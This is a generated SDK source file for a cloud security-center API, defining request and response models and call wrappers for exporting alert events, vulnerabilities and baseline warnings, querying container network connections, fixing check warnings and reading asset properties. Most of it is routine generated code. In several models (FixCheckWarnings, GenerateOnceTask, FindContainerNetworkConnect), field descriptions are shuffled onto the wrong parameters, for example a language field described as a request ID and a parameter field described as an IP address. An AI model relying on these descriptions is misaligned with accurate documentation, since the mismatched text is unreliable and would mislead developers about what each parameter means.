}

model ExportSuspEventsRequest {
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of assets.'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  dealed?: string(name='Dealed', description='The status of the alert event. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='Y'),
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious,remind'),
  name?: string(name='Name', description='The complete name of the exception.', example='WEBSHELL'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Others**', example='WEBSHELL'),
  remark?: string(name='Remark', description='The remarks.', example='remark'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX'),
  status?: string(name='Status', description='The handling status of the exception. Valid values:

*   **0**: all status
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted', example='0'),
  targetType?: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **uuid**: the UUID of the asset
*   **image_repo**: the ID of the image repository
*   **Cluster**: the ID of the cluster', example='uuid'),
  timeEnd?: string(name='TimeEnd', description='The end of the time range during which the exception is detected.', example='2022-12-05 00:00:00'),
  timeStart?: string(name='TimeStart', description='The beginning of the time range during which the exception is detected.', example='2022-10-01 00:00:00'),
}

model ExportSuspEventsResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221209'),
  id?: int32(name='Id', description='The ID of the export record.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='EF145C20-6A19-529A-8BDD-0671DXXXXXX'),
}

model ExportSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportSuspEventsResponseBody(name='body'),
}

async function exportSuspEventsWithOptions(request: ExportSuspEventsRequest, runtime: Util.RuntimeOptions): ExportSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportSuspEvents(request: ExportSuspEventsRequest): ExportSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportSuspEventsWithOptions(request, runtime);
}

model ExportVulRequest {
  aliasName?: string(name='AliasName', example='RHSA-2019:3197-Important: sudo security update'),
  attachTypes?: string(name='AttachTypes', example='sca'),
  dealed?: string(name='Dealed', example='n'),
  groupId?: string(name='GroupId', example='8834224'),
  lang?: string(name='Lang', example='zh'),
  necessity?: string(name='Necessity', example='asap'),
  searchTags?: string(name='SearchTags', example='Restart required'),
  type?: string(name='Type', example='app'),
  uuids?: string(name='Uuids', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', example='ins-133****,ins-5414****'),
}

model ExportVulResponseBody = {
  fileName?: string(name='FileName', example='app_20211101'),
  id?: long(name='Id', example='81634'),
  requestId?: string(name='RequestId', example='E1FAB2B8-DF4D-55DF-BC3D-5C3CA6FD5B13'),
}

model ExportVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportVulResponseBody(name='body'),
}

/**
  * The ID of the exported file.
  *
  * @param request ExportVulRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ExportVulResponse
 */
async function exportVulWithOptions(request: ExportVulRequest, runtime: Util.RuntimeOptions): ExportVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the exported file.
  *
  * @param request ExportVulRequest
  * @return ExportVulResponse
 */
async function exportVul(request: ExportVulRequest): ExportVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportVulWithOptions(request, runtime);
}

model ExportWarningRequest {
  dealed?: string(name='Dealed', description='Specifies whether the baseline risks are handled. Valid values:

*   **Y**: yes
*   **N**: no', example='N'),
  exportType?: string(name='ExportType', description='The type of the export task. Set the value to **hc_check_warning**, which indicates tasks to export baseline check results.', example='hc_check_warning'),
  isCleartextPwd?: int32(name='IsCleartextPwd', description='The export method of the results for the weak password baseline check. Valid values:

*   **0**: exports the check results after it is masked.
*   **1**: exports the check results in plaintext.', example='0'),
  isSummaryExport?: int32(name='IsSummaryExport', description='Specifies whether the baseline check results are aggregated and exported. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskIds?: string(name='RiskIds', description='The ID of the risk item in the baseline check results. Separate multiple IDs with commas (,).', example='123,124'),
  riskLevels?: string(name='RiskLevels', description='The severity of the baseline check item. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Windows 2016/2019  Security Baseline'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
  statusList?: string(name='StatusList', description='The status of the check item in the baseline check results. Separate multiple statuses with commas (,). Valid values:

*   **3**: passed
*   **1**: failed', example='1,3'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='12'),
  subTypeNames?: string(name='SubTypeNames', description='The subtypes of the baselines based on which baseline checks are performed. Separate multiple subtypes with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is contained in the **SubTypes** parameter. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the value of the TypeName parameter.', example='hc_middleware_ack_master'),
  typeName?: string(name='TypeName', description='The type of the baseline based on which baseline checks are performed.

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container'),
  typeNames?: string(name='TypeNames', description='The types of the baselines based on which baseline checks are performed. Separate multiple types with commas (,).

> You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container,cis'),
  uuids?: string(name='Uuids', description='The UUID of the server whose baseline check results you want to export. Separate multiple UUIDs with commas (,).', example='inet-7c676676-06fa-442e-90fb-b802e****,inet-7c676676-06fa-442e-90fb-b****'),
}

model ExportWarningResponseBody = {
  fileName?: string(name='FileName', description='The name of the file that contains exported baseline check results.', example='health_check_export_20220407'),
  id?: long(name='Id', description='The ID of the task to export baseline check results.

> You can call use the value of this parameter to call the [DescribeHcExportInfo](~~DescribeHcExportInfo~~) operation to query the export progress.', example='439316'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A7FC828B-C242-1005-9736-C7CC5DC09FF0'),
}

model ExportWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportWarningResponseBody(name='body'),
}

async function exportWarningWithOptions(request: ExportWarningRequest, runtime: Util.RuntimeOptions): ExportWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.isCleartextPwd)) {
    query['IsCleartextPwd'] = request.isCleartextPwd;
  }
  if (!Util.isUnset(request.isSummaryExport)) {
    query['IsSummaryExport'] = request.isSummaryExport;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.subTypeNames)) {
    query['SubTypeNames'] = request.subTypeNames;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.typeNames)) {
    query['TypeNames'] = request.typeNames;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportWarning(request: ExportWarningRequest): ExportWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportWarningWithOptions(request, runtime);
}

model FindContainerNetworkConnectRequest {
  criteriaType?: string(name='CriteriaType', description='The number of entries returned per page. Default value: **20**.', example='EDGE'),
  currentPage?: long(name='CurrentPage', example='1'),
  dstNode?: {
    appName?: string(name='AppName', example='nginx-ingress-controller'),
    clusterId?: string(name='ClusterId', example='f5x833820xx'),
    namespace?: string(name='Namespace', example='default'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType', example='app'),
    podName?: string(name='PodName', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='DstNode'),
  endTime?: long(name='EndTime', example='1649260799999'),
  pageSize?: long(name='PageSize', example='20'),
  srcNode?: {
    appName?: string(name='AppName', example='arms-prometheus-ack-arms-prometheus'),
    clusterId?: string(name='ClusterId', example='c56xxx1775dea0'),
    namespace?: string(name='Namespace', example='default'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType', example='app'),
    podName?: string(name='PodName', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='SrcNode'),
  startTime?: long(name='StartTime', description='The page number of the returned page.', example='1666886400000'),
}

model FindContainerNetworkConnectShrinkRequest {
  criteriaType?: string(name='CriteriaType', description='The number of entries returned per page. Default value: **20**.', example='EDGE'),
  currentPage?: long(name='CurrentPage', example='1'),
  dstNodeShrink?: string(name='DstNode'),
  endTime?: long(name='EndTime', example='1649260799999'),
  pageSize?: long(name='PageSize', example='20'),
  srcNodeShrink?: string(name='SrcNode'),
  startTime?: long(name='StartTime', description='The page number of the returned page.', example='1666886400000'),
}

model FindContainerNetworkConnectResponseBody = {
  connects?: [ 
    {
      dstContainer?: {
        containerId?: string(name='ContainerId', example='48a6dxxx9d5a5866'),
      }(name='DstContainer'),
      dstIp?: string(name='DstIp', example='172.20.62.176'),
      dstPort?: string(name='DstPort', example='443'),
      firstTime?: long(name='FirstTime'),
      id?: long(name='Id', example='1458'),
      lastTime?: long(name='LastTime'),
      srcContainer?: {
        containerId?: string(name='ContainerId', example='48a6xxx5709d5a5866'),
      }(name='SrcContainer'),
      srcIp?: string(name='SrcIp', example='35.233.62.116'),
      srcPort?: string(name='SrcPort', example='10240'),
    }
  ](name='Connects'),
  pageInfo?: {
    count?: long(name='Count', example='10'),
    currentPage?: long(name='CurrentPage', example='1'),
    pageSize?: long(name='PageSize', example='20'),
    totalCount?: long(name='TotalCount', example='12'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='8686CE6E-9BFA-5436-A9D9-77B984AEE7F8'),
}

model FindContainerNetworkConnectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FindContainerNetworkConnectResponseBody(name='body'),
}

async function findContainerNetworkConnectWithOptions(tmpReq: FindContainerNetworkConnectRequest, runtime: Util.RuntimeOptions): FindContainerNetworkConnectResponse {
  Util.validateModel(tmpReq);
  var request = new FindContainerNetworkConnectShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstNode)) {
    request.dstNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstNode, 'DstNode', 'json');
  }
  if (!Util.isUnset(tmpReq.srcNode)) {
    request.srcNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcNode, 'SrcNode', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dstNodeShrink)) {
    query['DstNode'] = request.dstNodeShrink;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.srcNodeShrink)) {
    query['SrcNode'] = request.srcNodeShrink;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FindContainerNetworkConnect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function findContainerNetworkConnect(request: FindContainerNetworkConnectRequest): FindContainerNetworkConnectResponse {
  var runtime = new Util.RuntimeOptions{};
  return findContainerNetworkConnectWithOptions(request, runtime);
}

model FixCheckWarningsRequest {
  checkParams?: string(name='CheckParams', description='165.225.XX.XX', example='[{"checkId":8,"rules":[{"ruleId":"rule.ssh_Idle.interval","value":1,"paramList":[{"paramName":"range_val","value":"600"},{"paramName":"range_val","value":"600"}]},{"ruleId":"rule.ssh_Idle.count","value":1,"paramList":[{"paramName":"range_val","value":"3"}]}]}]'),
  lang?: string(name='Lang', description='The ID of the request.', example='zh'),
  riskId?: long(name='RiskId', description='The source IP address of the request.', example='10354'),
  sourceIp?: string(name='SourceIp', description='The UUID of the asset for which you want to fix the baseline risk item. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the UUIDs of assets.', example='165.225.XX.XX'),
  uuids?: string(name='Uuids', description='Fixes a baseline risk item.', example='75a417dda5f25edb5bed8f208a9a****,c7e10fd794262a1510d5648f9e5d****'),
}

model FixCheckWarningsResponseBody = {
  batchId?: long(name='BatchId', description='FixCheckWarnings', example='52370'),
  requestId?: string(name='RequestId', example='76C1D7FD-DB1E-45EA-B804-3FBD9A1DD9C0'),
}

model FixCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FixCheckWarningsResponseBody(name='body'),
}

async function fixCheckWarningsWithOptions(request: FixCheckWarningsRequest, runtime: Util.RuntimeOptions): FixCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkParams)) {
    query['CheckParams'] = request.checkParams;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FixCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function fixCheckWarnings(request: FixCheckWarningsRequest): FixCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return fixCheckWarningsWithOptions(request, runtime);
}

model GenerateOnceTaskRequest {
  param?: string(name='Param', description='The collection time.', example='{"mode":1,"problemType":"offline","uuids":"inet-795dcad1-360f-49d2-b01e-b7da7f1c****"}'),
  source?: string(name='Source', description='The total number of scan tasks.', example='Manual'),
  taskName?: string(name='TaskName', description='The ID of the last scan task.', example='CLIENT_PROBLEM_CHECK'),
  taskType?: string(name='TaskType', description='Indicates whether you can create more scan tasks. Valid values:

*   **true**: yes
*   **false**: no

> By default, a maximum of 10 scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create a scan task by calling this operation. You must wait for at least one of the 10 existing scan tasks to complete before you can create a scan task.', example='CLIENT_PROBLEM_CHECK'),
}

model GenerateOnceTaskResponseBody = {
  canCreate?: boolean(name='CanCreate', description='The number of scan tasks that are complete.', example='true'),
  collectTime?: long(name='CollectTime', example='1670307567000'),
  finishCount?: int32(name='FinishCount', example='61'),
  lastTask?: string(name='LastTask', example='38730bb078f4a1461d4ed283994c****'),
  requestId?: string(name='RequestId', description='The ID of the scan task.', example='8BB6B8FA-39E8-5654-A309-8EED13B1****'),
  taskId?: string(name='TaskId', example='38730bb078f4a1461d4ed283994c****'),
  totalCount?: int32(name='TotalCount', example='100'),
}

model GenerateOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GenerateOnceTaskResponseBody(name='body'),
}

async function generateOnceTaskWithOptions(request: GenerateOnceTaskRequest, runtime: Util.RuntimeOptions): GenerateOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function generateOnceTask(request: GenerateOnceTaskRequest): GenerateOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateOnceTaskWithOptions(request, runtime);
}

model GetAlarmMachineCountRequest {
  from?: string(name='From', example='sas'),
}

model GetAlarmMachineCountResponseBody = {
  data?: {
    machineCount?: int32(name='MachineCount', example='1'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='6D3A2E7D-1238-5DD4-B3C3-BF06FCAD****'),
}

model GetAlarmMachineCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAlarmMachineCountResponseBody(name='body'),
}

async function getAlarmMachineCountWithOptions(request: GetAlarmMachineCountRequest, runtime: Util.RuntimeOptions): GetAlarmMachineCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAlarmMachineCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAlarmMachineCount(request: GetAlarmMachineCountRequest): GetAlarmMachineCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAlarmMachineCountWithOptions(request, runtime);
}

model GetAppNetworkRequest {
  clusterId?: string(name='ClusterId', example='cf77xxx'),
  endTime?: long(name='EndTime', example='1650470399999'),
  startTime?: long(name='StartTime', example='1649260800000'),
}

model GetAppNetworkResponseBody = {
  appNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', example='102'),
        dstNodeType?: string(name='DstNodeType', example='app'),
        id?: string(name='Id', example='3534'),
        port?: string(name='Port', example='8080'),
        srcNodeId?: string(name='SrcNodeId', example='101'),
        srcNodeType?: string(name='SrcNodeType', example='app'),
      }
    ](name='Edge'),
    namespace?: [ 
      {
        id?: string(name='Id', example='1'),
        name?: string(name='Name', example='default'),
      }
    ](name='Namespace'),
    node?: [ 
      {
        containerIds?: [ string ](name='ContainerIds'),
        id?: string(name='Id', example='1274'),
        name?: string(name='Name', example='console'),
        namespaceId?: string(name='NamespaceId', example='1'),
        riskLevel?: string(name='RiskLevel', example='0'),
        type?: string(name='Type', example='app'),
      }
    ](name='Node'),
  }(name='AppNetwork'),
  requestId?: string(name='RequestId', example='7D46EDB0-xxx'),
}

model GetAppNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAppNetworkResponseBody(name='body'),
}

async function getAppNetworkWithOptions(request: GetAppNetworkRequest, runtime: Util.RuntimeOptions): GetAppNetworkResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAppNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAppNetwork(request: GetAppNetworkRequest): GetAppNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAppNetworkWithOptions(request, runtime);
}

model GetAssetSelectionConfigRequest {
  businessType?: string(name='BusinessType', example='VIRUS_SCAN_CYCLE_CONFIG'),
}

model GetAssetSelectionConfigResponseBody = {
  data?: {
    selectionKey?: string(name='SelectionKey', example='657c8411-4e89-446c-ab66-d45d1331****'),
    targetType?: string(name='TargetType', example='instance'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='C5936B67-3EDF-53ED-A542-02543972449A'),
}

model GetAssetSelectionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetSelectionConfigResponseBody(name='body'),
}

async function getAssetSelectionConfigWithOptions(request: GetAssetSelectionConfigRequest, runtime: Util.RuntimeOptions): GetAssetSelectionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.businessType)) {
    query['BusinessType'] = request.businessType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetSelectionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetSelectionConfig(request: GetAssetSelectionConfigRequest): GetAssetSelectionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetSelectionConfigWithOptions(request, runtime);
}

model GetAssetsPropertyDetailRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: website', example='lkm'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  itemName?: string(name='ItemName', description='The name of the aggregation item for the asset fingerprint that you want to query.

> You can call the [GetAssetsPropertyItem](~~GetAssetsPropertyItem~~) operation to query the names of aggregation items.', example='virtio'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='1.2.XX.XX'),
  searchCriteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the condition. Valid values:

*   **remarkItemName**: the aggregation item of the asset fingerprints. Fuzzy match is supported.

> 

*   If **Biz** is set to **web_server**, **remarkItemName** specifies a domain name.

*   If **Biz** is set to **lkm**, **remarkItemName** specifies a module name.

*   If **Biz** is set to **autorun**, **remarkItemName** specifies the path to a startup item.', example='remarkItemName'),
      value?: string(name='Value', description='The value of the condition.', example='virtio'),
    }
  ](name='SearchCriteriaList', description='The conditions that are used to query the details about the asset fingerprint.'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='38f72ea4-4c9f-4df1-bc6c-0f267614****'),
}

model GetAssetsPropertyDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
